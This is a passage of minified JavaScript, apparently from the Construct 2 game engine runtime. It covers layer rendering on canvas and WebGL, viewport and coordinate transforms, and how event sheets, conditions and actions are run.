s=t.get_zindex(),e=e.get_zindex();cr.arrayRemove(this.instances,s),s<e&&e--,i&&e++,e===this.instances.length?this.instances.push(t):this.instances.splice(e,0,t),this.setZIndicesStaleFrom(s<e?s:e)},e.prototype.setZIndicesStaleFrom=function(t){(-1===this.zindices_stale_from||t<this.zindices_stale_from)&&(this.zindices_stale_from=t),this.zindices_stale=!0,this.render_list_stale=!0},e.prototype.updateZIndices=function(){if(this.zindices_stale){var t,e,i;if(-1===this.zindices_stale_from&&(this.zindices_stale_from=0),this.useRenderCells)for(t=this.zindices_stale_from,e=this.instances.length;t<e;++t)(i=this.instances[t]).zindex=t,this.render_grid.markRangeChanged(i.rendercells);else for(t=this.zindices_stale_from,e=this.instances.length;t<e;++t)this.instances[t].zindex=t;this.zindices_stale=!1,this.zindices_stale_from=-1}},e.prototype.getScale=function(t){return this.getNormalScale()*(this.runtime.fullscreenScalingQuality||t?this.runtime.aspect_scale:1)},e.prototype.getNormalScale=function(){return(this.scale*this.layout.scale-1)*this.zoomRate+1},e.prototype.getAngle=function(){return this.disableAngle?0:cr.clamp_angle(this.layout.angle+this.angle)};var i=[];function h(){return i.length?i.pop():[]}function u(t){cr.clearArray(t),i.push(t)}var c=[];function s(t,e){for(var i,s,n,r=0,o=t.length;r<o-1;r+=2)(function(t,e,i){var s,n,r=0,o=0,a=0,h=t.length,c=e.length;for(i.length=h+c;r<h&&o<c;++a)s=t[r],n=e[o],s.zindex<n.zindex?(i[a]=s,++r):(i[a]=n,++o);for(;r<h;++r,++a)i[a]=t[r];for(;o<c;++o,++a)i[a]=e[o]})(i=t[r],s=t[r+1],n=h()),e||(u(i),u(s)),c.push(n);o%2==1&&(e?(i=h(),cr.shallowAssignArray(i,t[o-1]),c.push(i)):c.push(t[o-1])),cr.shallowAssignArray(t,c),cr.clearArray(c)}var n=[];e.prototype.getRenderCellInstancesToDraw=function(){if(this.updateZIndices(),this.render_grid.queryRange(this.viewLeft,this.viewTop,this.viewRight,this.viewBottom,n),!n.length)return h();if(1===n.length){var t=h();return cr.shallowAssignArray(t,n[0]),cr.clearArray(n),t}t=function(t){for(var e=!0;1<t.length;)s(t,e),e=!1;return t[0]}(n);return cr.clearArray(n),t},e.prototype.draw=function(t){this.render_offscreen=this.forceOwnTexture||1!==this.opacity||0!==this.blend_mode;var e=this.runtime.canvas,i=t,s=!1;this.render_offscreen&&(this.runtime.layer_canvas||(this.runtime.layer_canvas=document.createElement("canvas"),(e=this.runtime.layer_canvas).width=this.runtime.draw_width,e.height=this.runtime.draw_height,this.runtime.layer_ctx=e.getContext("2d"),s=!0),e=this.runtime.layer_canvas,i=this.runtime.layer_ctx,e.width!==this.runtime.draw_width&&(e.width=this.runtime.draw_width,s=!0),e.height!==this.runtime.draw_height&&(e.height=this.runtime.draw_height,s=!0),s&&this.runtime.setCtxImageSmoothingEnabled(i,this.runtime.linearSampling),this.transparent&&i.clearRect(0,0,this.runtime.draw_width,this.runtime.draw_height)),i.globalAlpha=1,i.globalCompositeOperation="source-over",this.transparent||(i.fillStyle="rgb("+this.background_color[0]+","+this.background_color[1]+","+this.background_color[2]+")",i.fillRect(0,0,this.runtime.draw_width,this.runtime.draw_height)),i.save(),this.disableAngle=!0;var n=this.canvasToLayer(0,0,!0,!0),r=this.canvasToLayer(0,0,!1,!0);this.disableAngle=!1,this.runtime.pixel_rounding&&(n=Math.round(n),r=Math.round(r)),this.rotateViewport(n,r,i);var o,s=this.getScale();i.scale(s,s),i.translate(-n,-r),this.useRenderCells?(this.cur_render_cells.left=this.render_grid.XToCell(this.viewLeft),this.cur_render_cells.top=this.render_grid.YToCell(this.viewTop),this.cur_render_cells.right=this.render_grid.XToCell(this.viewRight),this.cur_render_cells.bottom=this.render_grid.YToCell(this.viewBottom),this.render_list_stale||!this.cur_render_cells.equals(this.last_render_cells)?(u(this.last_render_list),o=this.getRenderCellInstancesToDraw(),this.render_list_stale=!1,this.last_render_cells.copy(this.cur_render_cells)):o=this.last_render_list):o=this.instances;for(var a,h=null,c=0,l=o.length;c<l;++c)(a=o[c])!==h&&(this.drawInstance(a,i),h=a);this.useRenderCells&&(this.last_render_list=o),i.restore(),this.render_offscreen&&(t.globalCompositeOperation=this.compositeOp,t.globalAlpha=this.opacity,t.drawImage(e,0,0))},e.prototype.drawInstance=function(t,e){var i;t.visible&&0!==t.width&&0!==t.height&&(t.update_bbox(),(i=t.bbox).right<this.viewLeft||i.bottom<this.viewTop||i.left>this.viewRight||i.top>this.viewBottom||(e.globalCompositeOperation=t.compositeOp,t.draw(e)))},e.prototype.updateViewport=function(t){this.disableAngle=!0;var e=this.canvasToLayer(0,0,!0,!0),i=this.canvasToLayer(0,0,!1,!0);this.disableAngle=!1,this.runtime.pixel_rounding&&(e=Math.round(e),i=Math.round(i)),this.rotateViewport(e,i,t)},e.prototype.rotateViewport=function(t,e,i){var s=this.getScale();this.viewLeft=t,this.viewTop=e,this.viewRight=t+this.runtime.draw_width*(1/s),this.viewBottom=e+this.runtime.draw_height*(1/s),this.viewLeft>this.viewRight&&(n=this.viewLeft,this.viewLeft=this.viewRight,this.viewRight=n),this.viewTop>this.viewBottom&&(n=this.viewTop,this.viewTop=this.viewBottom,this.viewBottom=n);var n=this.getAngle();0!==n&&(i&&(i.translate(this.runtime.draw_width/2,this.runtime.draw_height/2),i.rotate(-n),i.translate(this.runtime.draw_width/-2,this.runtime.draw_height/-2)),this.tmprect.set(this.viewLeft,this.viewTop,this.viewRight,this.viewBottom),this.tmprect.offset((this.viewLeft+this.viewRight)/-2,(this.viewTop+this.viewBottom)/-2),this.tmpquad.set_from_rotated_rect(this.tmprect,n),this.tmpquad.bounding_box(this.tmprect),this.tmprect.offset((this.viewLeft+this.viewRight)/2,(this.viewTop+this.viewBottom)/2),this.viewLeft=this.tmprect.left,this.viewTop=this.tmprect.top,this.viewRight=this.tmprect.right,this.viewBottom=this.tmprect.bottom)},e.prototype.drawGL_earlyZPass=function(t){this.runtime.draw_width,this.runtime.draw_height;this.render_offscreen=this.forceOwnTexture,this.render_offscreen&&(this.runtime.layer_tex||(this.runtime.layer_tex=t.createEmptyTexture(this.runtime.draw_width,this.runtime.draw_height,this.runtime.linearSampling)),this.runtime.layer_tex.c2width===this.runtime.draw_width&&this.runtime.layer_tex.c2height===this.runtime.draw_height||(t.deleteTexture(this.runtime.layer_tex),this.runtime.layer_tex=t.createEmptyTexture(this.runtime.draw_width,this.runtime.draw_height,this.runtime.linearSampling)),t.setRenderingToTexture(this.runtime.layer_tex)),this.disableAngle=!0;var e=this.canvasToLayer(0,0,!0,!0),i=this.canvasToLayer(0,0,!1,!0);this.disableAngle=!1,this.runtime.pixel_rounding&&(e=Math.round(e),i=Math.round(i)),this.rotateViewport(e,i,null);var s,i=this.getScale();t.resetModelView(),t.scale(i,i),t.rotateZ(-this.getAngle()),t.translate((this.viewLeft+this.viewRight)/-2,(this.viewTop+this.viewBottom)/-2),t.updateModelView(),this.useRenderCells?(this.cur_render_cells.left=this.render_grid.XToCell(this.viewLeft),this.cur_render_cells.top=this.render_grid.YToCell(this.viewTop),this.cur_render_cells.right=this.render_grid.XToCell(this.viewRight),this.cur_render_cells.bottom=this.render_grid.YToCell(this.viewBottom),this.render_list_stale||!this.cur_render_cells.equals(this.last_render_cells)?(u(this.last_render_list),s=this.getRenderCellInstancesToDraw(),this.render_list_stale=!1,this.last_render_cells.copy(this.cur_render_cells)):s=this.last_render_list):s=this.instances;for(var n,r=null,o=s.length-1;0<=o;--o)(n=s[o])!==r&&(this.drawInstanceGL_earlyZPass(s[o],t),r=n);this.useRenderCells&&(this.last_render_list=s),this.transparent||(this.clear_earlyz_index=this.runtime.earlyz_index++,t.setEarlyZIndex(this.clear_earlyz_index),t.setColorFillMode(1,1,1,1),t.fullscreenQuad(),t.restoreEarlyZMode())},e.prototype.drawGL=function(t){this.runtime.draw_width,this.runtime.draw_height;var e=0,i=0;this.render_offscreen=this.forceOwnTexture||1!==this.opacity||0<this.active_effect_types.length||0!==this.blend_mode,this.render_offscreen&&(this.runtime.layer_tex||(this.runtime.layer_tex=t.createEmptyTexture(this.runtime.draw_width,this.runtime.draw_height,this.runtime.linearSampling)),this.runtime.layer_tex.c2width===this.runtime.draw_width&&this.runtime.layer_tex.c2height===this.runtime.draw_height||(t.deleteTexture(this.runtime.layer_tex),this.runtime.layer_tex=t.createEmptyTexture(this.runtime.draw_width,this.runtime.draw_height,this.runtime.linearSampling)),t.setRenderingToTexture(this.runtime.layer_tex),this.transparent&&t.clear(0,0,0,0)),this.transparent||(this.runtime.enableFrontToBack?(t.setEarlyZIndex(this.clear_earlyz_index),t.setColorFillMode(this.background_color[0]/255,this.background_color[1]/255,this.background_color[2]/255,1),t.fullscreenQuad(),t.setTextureFillMode()):t.clear(this.background_color[0]/255,this.background_color[1]/255,this.background_color[2]/255,1)),this.disableAngle=!0;var s=this.canvasToLayer(0,0,!0,!0),n=this.canvasToLayer(0,0,!1,!0);this.disableAngle=!1,this.runtime.pixel_rounding&&(s=Math.round(s),n=Math.round(n)),this.rotateViewport(s,n,null);var r,n=this.getScale();t.resetModelView(),t.scale(n,n),t.rotateZ(-this.getAngle()),t.translate((this.viewLeft+this.viewRight)/-2,(this.viewTop+this.viewBottom)/-2),t.updateModelView(),this.useRenderCells?(this.cur_render_cells.left=this.render_grid.XToCell(this.viewLeft),this.cur_render_cells.top=this.render_grid.YToCell(this.viewTop),this.cur_render_cells.right=this.render_grid.XToCell(this.viewRight),this.cur_render_cells.bottom=this.render_grid.YToCell(this.viewBottom),this.render_list_stale||!this.cur_render_cells.equals(this.last_render_cells)?(u(this.last_render_list),r=this.getRenderCellInstancesToDraw(),this.render_list_stale=!1,this.last_render_cells.copy(this.cur_render_cells)):r=this.last_render_list):r=this.instances;for(var o,a=null,h=0,c=r.length;h<c;++h)(o=r[h])!==a&&(this.drawInstanceGL(r[h],t),a=o);this.useRenderCells&&(this.last_render_list=r),this.render_offscreen&&(e=this.active_effect_types.length?this.active_effect_types[0].shaderindex:0,i=this.active_effect_types.length?this.active_effect_types[0].index:0,0===this.active_effect_types.length||1===this.active_effect_types.length&&!t.programUsesCrossSampling(e)&&1===this.opacity?(1===this.active_effect_types.length?(t.switchProgram(e),t.setProgramParameters(this.layout.getRenderTarget(),1/this.runtime.draw_width,1/this.runtime.draw_height,0,0,1,1,n,this.getAngle(),this.viewLeft,this.viewTop,(this.viewLeft+this.viewRight)/2,(this.viewTop+this.viewBottom)/2,this.runtime.kahanTime.sum,this.effect_params[i]),t.programIsAnimated(e)&&(this.runtime.redraw=!0)):t.switchProgram(0),t.setRenderingToTexture(this.layout.getRenderTarget()),t.setOpacity(this.opacity),t.setTexture(this.runtime.layer_tex),t.setBlend(this.srcBlend,this.destBlend),t.resetModelView(),t.updateModelView(),i=this.runtime.draw_width/2,e=this.runtime.draw_height/2,t.quad(-i,e,i,e,i,-e,-i,-e),t.setTexture(null)):this.layout.renderEffectChain(t,this,null,this.layout.getRenderTarget()))},e.prototype.drawInstanceGL=function(t,e){var i;t.visible&&0!==t.width&&0!==t.height&&(t.update_bbox(),(i=t.bbox).right<this.viewLeft||i.bottom<this.viewTop||i.left>this.viewRight||i.top>this.viewBottom||(e.setEarlyZIndex(t.earlyz_index),t.uses_shaders?this.drawInstanceWithShadersGL(t,e):(e.switchProgram(0),e.setBlend(t.srcBlend,t.destBlend),t.drawGL(e))))},e.prototype.drawInstanceGL_earlyZPass=function(t,e){var i;t.visible&&0!==t.width&&0!==t.height&&(t.update_bbox(),(i=t.bbox).right<this.viewLeft||i.bottom<this.viewTop||i.left>this.viewRight||i.top>this.viewBottom||(t.earlyz_index=this.runtime.earlyz_index++,0===t.blend_mode&&1===t.opacity&&t.shaders_preserve_opaqueness&&t.drawGL_earlyZPass&&(e.setEarlyZIndex(t.earlyz_index),t.drawGL_earlyZPass(e))))},e.prototype.drawInstanceWithShadersGL=function(t,e){var i,s,n,r,o,a,h,c,l,u=t.active_effect_types[0].shaderindex,p=t.active_effect_types[0].index,d=this.getScale();1!==t.active_effect_types.length||e.programUsesCrossSampling(u)||e.programExtendsBox(u)||(t.angle||t.layer.getAngle())&&e.programUsesDest(u)||1!==t.opacity||t.type.plugin.must_predraw?(this.layout.renderEffectChain(e,this,t,this.render_offscreen?this.runtime.layer_tex:this.layout.getRenderTarget()),e.resetModelView(),e.scale(d,d),e.rotateZ(-this.getAngle()),e.translate((this.viewLeft+this.viewRight)/-2,(this.viewTop+this.viewBottom)/-2),e.updateModelView()):(e.switchProgram(u),e.setBlend(t.srcBlend,t.destBlend),e.programIsAnimated(u)&&(this.runtime.redraw=!0),h=a=o=r=0,e.programUsesDest(u)&&(n=t.bbox,i=this.layerToCanvas(n.left,n.top,!0,!0),s=this.layerToCanvas(n.left,n.top,!1,!0),u=this.layerToCanvas(n.right,n.bottom,!0,!0),n=this.layerToCanvas(n.right,n.bottom,!1,!0),r=i/windowWidth,o=1-s/windowHeight,a=u/windowWidth,h=1-n/windowHeight),l=t.curFrame&&t.curFrame.texture_img?(c=1/(l=t.curFrame.texture_img).width,1/l.height):(c=1/t.width,1/t.height),e.setProgramParameters(this.render_offscreen?this.runtime.layer_tex:this.layout.getRenderTarget(),c,l,r,o,a,h,d,this.getAngle(),this.viewLeft,this.viewTop,(this.viewLeft+this.viewRight)/2,(this.viewTop+this.viewBottom)/2,this.runtime.kahanTime.sum,t.effect_params[p]),t.drawGL(e))},e.prototype.canvasToLayer=function(t,e,i,s){var n=this.runtime.devicePixelRatio;this.runtime.isRetina&&(t*=n,e*=n);var r=this.runtime.parallax_x_origin,o=this.runtime.parallax_y_origin,a=(this.layout.scrollX-r)*this.parallaxX+r,h=(this.layout.scrollY-o)*this.parallaxY+o,n=a,r=h,o=1/this.getScale(!s);s?(n-=this.runtime.draw_width*o/2,r-=this.runtime.draw_height*o/2):(n-=this.runtime.width*o/2,r-=this.runtime.height*o/2),n+=t*o,r+=e*o;t=this.getAngle();return 0!==t&&(r-=h,t=(n-=a)*(e=Math.cos(t))-r*(o=Math.sin(t)),r=r*e+n*o,n=t,n+=a,r+=h),i?n:r},e.prototype.layerToCanvas=function(t,e,i,s){var n=this.runtime.parallax_x_origin,r=this.runtime.parallax_y_origin,o=(this.layout.scrollX-n)*this.parallaxX+n,a=(this.layout.scrollY-r)*this.parallaxY+r,h=o,c=a,l=this.getAngle();0!==l&&(e-=a,l=(t-=o)*(n=Math.cos(-l))-e*(r=Math.sin(-l)),e=e*n+t*r,t=l,t+=o,e+=a);a=1/this.getScale(!s);s?(h-=this.runtime.draw_width*a/2,c-=this.runtime.draw_height*a/2):(h-=this.runtime.width*a/2,c-=this.runtime.height*a/2),h=(t-h)/a,c=(e-c)/a;a=this.runtime.devicePixelRatio;return this.runtime.isRetina&&!s&&(h/=a,c/=a),i?h:c},e.prototype.rotatePt=function(t,e,i){if(0===this.getAngle())return i?t:e;var s=this.layerToCanvas(t,e,!0),t=this.layerToCanvas(t,e,!1);this.disableAngle=!0;e=this.canvasToLayer(s,t,!0),t=this.canvasToLayer(s,t,!0);return this.disableAngle=!1,i?e:t},e.prototype.saveToJSON=function(){for(var t,e={s:this.scale,a:this.angle,vl:this.viewLeft,vt:this.viewTop,vr:this.viewRight,vb:this.viewBottom,v:this.visible,bc:this.background_color,t:this.transparent,px:this.parallaxX,py:this.parallaxY,o:this.opacity,zr:this.zoomRate,fx:[],cg:this.created_globals,instances:[]},i=0,s=this.effect_types.length;i<s;i++)t=this.effect_types[i],e.fx.push({name:t.name,active:t.active,params:this.effect_params[t.index]});return e},e.prototype.loadFromJSON=function(t){var e,i;this.scale=t.s,this.angle=t.a,this.viewLeft=t.vl,this.viewTop=t.vt,this.viewRight=t.vr,this.viewBottom=t.vb,this.visible=t.v,this.background_color=t.bc,this.transparent=t.t,this.parallaxX=t.px,this.parallaxY=t.py,this.opacity=t.o,this.zoomRate=t.zr,this.created_globals=t.cg||[],cr.shallowAssignArray(this.initial_instances,this.startup_initial_instances);for(var s=new cr.ObjectSet,n=0,r=this.created_globals.length;n<r;++n)s.add(this.created_globals[n]);for(e=n=0,r=this.initial_instances.length;n<r;++n)s.contains(this.initial_instances[n][2])||(this.initial_instances[e]=this.initial_instances[n],++e);cr.truncateArray(this.initial_instances,e);var o=t.fx;for(n=0,r=o.length;n<r;n++)(i=this.getEffectByName(o[n].name))&&(i.active=o[n].active,this.effect_params[i.index]=o[n].params);this.updateActiveEffects(),this.instances.sort(y),this.zindices_stale=!0},cr.layer=e}(),function(){var o=[];function a(t,e){return t.index-e.index}function n(t){var e,i,s,n,r;for(2===t.length?t[0].index>t[1].index&&(n=t[0],t[0]=t[1],t[1]=n):2<t.length&&t.sort(a),t.length>=o.length&&(o.length=t.length+1),o[t.length]||(o[t.length]=[]),e=0,i=(r=o[t.length]).length;e<i;e++)if(function(t,e){var i,s=t.length;switch(s){case 0:return 1;case 1:return t[0]===e[0];case 2:return t[0]===e[0]&&t[1]===e[1];default:for(i=0;i<s;i++)if(t[i]!==e[i])return;return 1}}(t,s=r[e]))return s;return r.push(t),t}function t(t,e){this.runtime=t,this.triggers={},this.fasttriggers={},this.hasRun=!1,this.includes=new cr.ObjectSet,this.deep_includes=[],this.already_included_sheets=[],this.name=e[0];var i,s,n=e[1];for(this.events=[],i=0,s=n.length;i<s;i++)this.init_event(n[i],null,this.events)}function e(t){this.type=t,this.instances=[],this.else_instances=[],this.select_all=!0}function i(t,e,i){this.sheet=t,this.parent=e,this.runtime=t.runtime,this.solModifiers=[],this.solModifiersIncludingParents=[],this.solWriterAfterCnds=!1,this.group=!1,this.initially_activated=!1,this.toplevelevent=!1,this.toplevelgroup=!1,this.has_else_block=!1,this.conditions=[],this.actions=[],this.subevents=[],this.group_name="",this.group=!1,this.initially_activated=!1,this.group_active=!1,this.contained_includes=null,i[1]&&(this.group_name=i[1][1].toLowerCase(),this.group=!0,this.initially_activated=!!i[1][0],this.contained_includes=[],this.group_active=this.initially_activated,this.runtime.allGroups.push(this),this.runtime.groups_by_name[this.group_name]=this),this.orblock=i[2],this.sid=i[4],this.group||(this.runtime.blocksBySid[this.sid.toString()]=this);var s=i[5];for(h=0,c=s.length;h<c;h++){var n=new cr.condition(this,s[h]);n.index=h,cr.seal(n),this.conditions.push(n),this.addSolModifier(n.type)}var r=i[6];for(h=0,c=r.length;h<c;h++){var o=new cr.action(this,r[h]);o.index=h,cr.seal(o),this.actions.push(o)}if(8===i.length)for(var a=i[7],h=0,c=a.length;h<c;h++)this.sheet.init_event(a[h],this,this.subevents);this.is_else_block=!1,this.conditions.length&&(this.is_else_block=null==this.conditions[0].type&&this.conditions[0].func==cr.system_object.prototype.cnds.Else)}function s(t,e){var i,s,n;if(t&&(-1===e.indexOf(t)&&e.push(t),t.is_contained))for(i=0,s=t.container.length;i<s;i++)t!==(n=t.container[i])&&-1===e.indexOf(n)&&e.push(n)}function r(t,e){if(this.block=t,this.sheet=t.sheet,this.runtime=t.runtime,this.parameters=[],this.results=[],this.extra={},this.index=-1,this.anyParamVariesPerInstance=!1,this.func=this.runtime.GetObjectReference(e[1]),this.trigger=0<e[3],this.fasttrigger=2===e[3],this.looping=e[4],this.inverted=e[5],this.isstatic=e[6],this.sid=e[7],this.runtime.cndsBySid[this.sid.toString()]=this,-1===e[0]?(this.type=null,this.run=this.run_system,this.behaviortype=null,this.beh_index=-1):(this.type=this.runtime.types_by_index[e[0]],this.isstatic?this.run=this.run_static:this.run=this.run_object,e[2]?(this.behaviortype=this.type.getBehaviorByName(e[2]),this.beh_index=this.type.getBehaviorIndexByName(e[2])):(this.behaviortype=null,this.beh_index=-1),this.block.parent&&this.block.parent.setSolWriterAfterCnds()),this.fasttrigger&&(this.run=this.run_true),10===e.length){for(var i=e[9],s=0,n=i.length;s<n;s++){var r=new cr.parameter(this,i[s]);cr.seal(r),this.parameters.push(r)}this.results.length=i.length}}function h(t,e){if(this.block=t,this.sheet=t.sheet,this.runtime=t.runtime,this.parameters=[],this.results=[],this.extra={},this.index=-1,this.anyParamVariesPerInstance=!1,this.func=this.runtime.GetObjectReference(e[1]),-1===e[0]?(this.type=null,this.run=this.run_system,this.behaviortype=null,this.beh_index=-1):(this.type=this.runtime.types_by_index[e[0]],this.run=this.run_object,e[2]?(this.behaviortype=this.type.getBehaviorByName(e[2]),this.beh_index=this.type.getBehaviorIndexByName(e[2])):(this.behaviortype=null,this.beh_index=-1)),this.sid=e[3],this.runtime.actsBySid[this.sid.toString()]=this,6===e.length){for(var i=e[5],s=0,n=i.length;s<n;s++){var r=new cr.parameter(this,i[s]);cr.seal(r),this.parameters.push(r)}this.results.length=i.length}}t.prototype.toString=function(){return this.name},t.prototype.init_event=function(t,e,i){switch(t[0]){case 0:var s,n,r=new cr.eventblock(this,e,t);if(cr.seal(r),r.orblock)for(i.push(r),s=0,n=r.conditions.length;s<n;s++)r.conditions[s].trigger&&this.init_trigger(r,s);else r.is_trigger()?this.init_trigger(r,0):i.push(r);break;case 1:var o=new cr.eventvariable(this,e,t);cr.seal(o),i.push(o);break;case 2:o=new cr.eventinclude(this,e,t);cr.seal(o),i.push(o)}},t.prototype.postInit=function(){for(var t=0,e=this.events.length;t<e;t++)this.events[t].postInit(t<e-1&&this.events[t+1].is_else_block)},t.prototype.updateDeepIncludes=function(){cr.clearArray(this.deep_includes),cr.clearArray(this.already_included_sheets),this.addDeepIncludes(this),cr.clearArray(this.already_included_sheets)},t.prototype.addDeepIncludes=function(t){for(var e,i,s=t.deep_includes,n=t.already_included_sheets,r=this.includes.valuesRef(),o=0,a=r.length;o<a;++o)i=(e=r[o]).include_sheet,!e.isActive()||t===i||-1<n.indexOf(i)||(n.push(i),i.addDeepIncludes(t),s.push(i))},t.prototype.run=function(t){var e,i;for(this.runtime.resuming_breakpoint||(this.hasRun=!0,t||(this.runtime.isRunningEvents=!0)),e=0,i=this.events.length;e<i;e++){var s=this.events[e];s.run(),this.runtime.clearSol(s.solModifiers),this.runtime.hasPendingInstances&&this.runtime.ClearDeathRow()}t||(this.runtime.isRunningEvents=!1)},t.prototype.init_trigger=function(t,e){t.orblock||this.runtime.triggers_to_postinit.push(t);var i=t.conditions[e],s=i.type?i.type.name:"system",n=i.fasttrigger,r=n?this.fasttriggers:this.triggers;r[s]||(r[s]=[]);var o=r[s],a=i.func;if(n){if(i.parameters.length){var h=i.parameters[0];if(1===h.type&&2===h.expression.type){var c,l,u,p=h.expression.value.toLowerCase();for(l=0,u=o.length;l<u;l++)if(o[l].method==a)return void((c=o[l].evs)[p]?c[p].push([t,e]):c[p]=[[t,e]]);(c={})[p]=[[t,e]],o.push({method:a,evs:c})}}}else{for(l=0,u=o.length;l<u;l++)if(o[l].method==a)return void o[l].evs.push([t,e]);h=a,cr.plugins_.Sprite&&h===cr.plugins_.Sprite.prototype.cnds.OnFrameChanged?o.unshift({method:a,evs:[[t,e]]}):o.push({method:a,evs:[[t,e]]})}},cr.eventsheet=t,e.prototype.hasObjects=function(){return(this.select_all?this.type:this).instances.length},e.prototype.getObjects=function(){return(this.select_all?this.type:this).instances},e.prototype.pick_one=function(t){var e;t&&(t.runtime.getCurrentEventStack().current_event.orblock?(this.select_all&&(cr.clearArray(this.instances),cr.shallowAssignArray(this.else_instances,t.type.instances),this.select_all=!1),-1!==(e=this.else_instances.indexOf(t))&&(this.instances.push(this.else_instances[e]),this.else_instances.splice(e,1))):(this.select_all=!1,cr.clearArray(this.instances),this.instances[0]=t))},cr.selection=e,window._c2hh_="6A19FFAE7F62FE8813F3700E41734FD8D2C6DB17",i.prototype.postInit=function(t){var e,i,s=this.parent;if(this.group)for(this.toplevelgroup=!0;s;){if(!s.group){this.toplevelgroup=!1;break}s=s.parent}for(this.toplevelevent=!this.is_trigger()&&(!this.parent||this.parent.group&&this.parent.toplevelgroup),this.has_else_block=!!t,this.solModifiersIncludingParents=this.solModifiers.slice(0),s=this.parent;s;){for(e=0,i=s.solModifiers.length;e<i;e++)this.addParentSolModifier(s.solModifiers[e]);s=s.parent}for(this.solModifiers=n(this.solModifiers),this.solModifiersIncludingParents=n(this.solModifiersIncludingParents),e=0,i=this.conditions.length;e<i;e++)this.conditions[e].postInit();for(e=0,i=this.actions.length;e<i;e++)this.actions[e].postInit();for(e=0,i=this.subevents.length;e<i;e++)this.subevents[e].postInit(e<i-1&&this.subevents[e+1].is_else_block)},i.prototype.setGroupActive=function(t){if(this.group_active!==!!t){var e,i;for(this.group_active=!!t,e=0,i=this.contained_includes.length;e<i;++e)this.contained_includes[e].updateActive();0<i&&this.runtime.running_layout.event_sheet&&this.runtime.running_layout.event_sheet.updateDeepIncludes()}},i.prototype.addSolModifier=function(t){s(t,this.solModifiers)},i.prototype.addParentSolModifier=function(t){s(t,this.solModifiersIncludingParents)},i.prototype.setSolWriterAfterCnds=function(){this.solWriterAfterCnds=!0,this.parent&&this.parent.setSolWriterAfterCnds()},i.prototype.is_trigger=function(){return!!this.conditions.length&&this.conditions[0].trigger},i.prototype.run=function(){var t,e,i=!1,s=this.runtime,n=this.runtime.getCurrentEventStack(),r=(n.current_event=this).conditions;if(this.is_else_block||(n.else_branch_ran=!1),this.orblock){for(0===r.length&&(i=!0),n.cndindex=0,t=r.length;n.cndindex<t;n.cndindex++)(e=r[n.cndindex]).trigger||e.run()&&(i=!0);(n.last_event_true=i)&&this.run_actions_and_subevents()}else{for(n.cndindex=0,t=r.length;n.cndindex<t;n.cndindex++)if(!r[n.cndindex].run())return n.last_event_true=!1,void(this.toplevelevent&&s.hasPendingInstances&&s.ClearDeathRow());n.last_event_true=!0,this.run_actions_and_subevents()}this.end_run(n)},i.prototype.end_run=function(t){t.last_event_true&&this.has_else_block&&(t.else_branch_ran=!0),this.toplevelevent&&this.runtime.hasPendingInstances&&this.runtime.ClearDeathRow()},i.prototype.run_orblocktrigger=function(t){(this.runtime.getCurrentEventStack().current_event=this).conditions[t].run()&&(this.run_actions_and_subevents(),this.runtime.getCurrentEventStack().last_event_true=!0)},i.prototype.run_actions_and_subevents=function(){var t,e=this.runtime.getCurrentEventStack();for(e.actindex=0,t=this.actions.length;e.actindex<t;e.actindex++)if(this.actions[e.actindex].run())return;this.run_subevents()},i.prototype.resume_actions_and_subevents=function(){for(var t=this.runtime.getCurrentEventStack(),e=this.actions.length;t.actindex<e;t.actindex++)if(this.actions[t.actindex].run())return;this.run_subevents()},i.prototype.run_subevents=function(){if(this.subevents.length){var t,e,i,s,n=this.subevents.length-1;if(this.runtime.pushEventStack(this),this.solWriterAfterCnds)for(t=0,e=this.subevents.length;t<e;t++)i=this.subevents[t],(s=!this.toplevelgroup||!this.group&&t<n)&&this.runtime.pushCopySol(i.solModifiers),i.run(),s?this.runtime.popSol(i.solModifiers):this.runtime.clearSol(i.solModifiers);else for(t=0,e=this.subevents.length;t<e;t++)this.subevents[t].run();this.runtime.popEventStack()}},i.prototype.run_pretrigger=function(){var t=this.runtime.getCurrentEventStack();t.current_event=this;var e,i=!1;for(t.cndindex=0,e=this.conditions.length;t.cndindex<e;t.cndindex++)if(this.conditions[t.cndindex].run())i=!0;else if(!this.orblock)return!1;return!this.orblock||i},i.prototype.retrigger=function(){this.runtime.execcount++;var t,e=this.runtime.getCurrentEventStack().cndindex,i=this.runtime.pushEventStack(this);if(!this.orblock)for(i.cndindex=e+1,t=this.conditions.length;i.cndindex<t;i.cndindex++)if(!this.conditions[i.cndindex].run())return this.runtime.popEventStack(),!1;return this.run_actions_and_subevents(),this.runtime.popEventStack(),!0},i.prototype.isFirstConditionOfType=function(t){var e=t.index;if(0===e)return!0;for(--e;0<=e;--e)if(this.conditions[e].type===t.type)return!1;return!0},cr.eventblock=i,r.prototype.postInit=function(){for(var t,e=0,i=this.parameters.length;e<i;e++)(t=this.parameters[e]).postInit(),t.variesPerInstance&&(this.anyParamVariesPerInstance=!0)},r.prototype.run_true=function(){return!0},r.prototype.run_system=function(){for(var t=0,e=this.parameters.length;t<e;t++)this.results[t]=this.parameters[t].get();return cr.xor(this.func.apply(this.runtime.system,this.results),this.inverted)},r.prototype.run_static=function(){for(var t=0,e=this.parameters.length;t<e;t++)this.results[t]=this.parameters[t].get();var i=this.func.apply(this.behaviortype||this.type,this.results);return this.type.applySolToContainer(),i},r.prototype.run_object=function(){var t,e,i,s,n,r,o,a,h,c=this.type,l=c.getCurrentSol(),u=this.block.orblock&&!this.trigger,p=0,d=c.is_contained,g=c.is_family,f=c.family_index,m=this.beh_index,y=-1<m,_=this.anyParamVariesPerInstance,v=this.parameters,b=this.results,w=this.inverted,x=this.func;if(_)for(t=0,i=v.length;t<i;++t)(s=v[t]).variesPerInstance||(b[t]=s.get(0));else for(t=0,i=v.length;t<i;++t)b[t]=v[t].get(0);if(l.select_all){for(cr.clearArray(l.instances),cr.clearArray(l.else_instances),O=0,k=(S=c.instances).length;O<k;++O){if(r=S[O],_)for(t=0,i=v.length;t<i;++t)(s=v[t]).variesPerInstance&&(b[t]=s.get(O));n=y?(p=0,g&&(p=r.type.family_beh_map[f]),x.apply(r.behavior_insts[m+p],b)):x.apply(r,b),cr.xor(n,w)?l.instances.push(r):u&&l.else_instances.push(r)}return c.finish&&c.finish(!0),l.select_all=!1,c.applySolToContainer(),l.hasObjects()}e=0;for(var 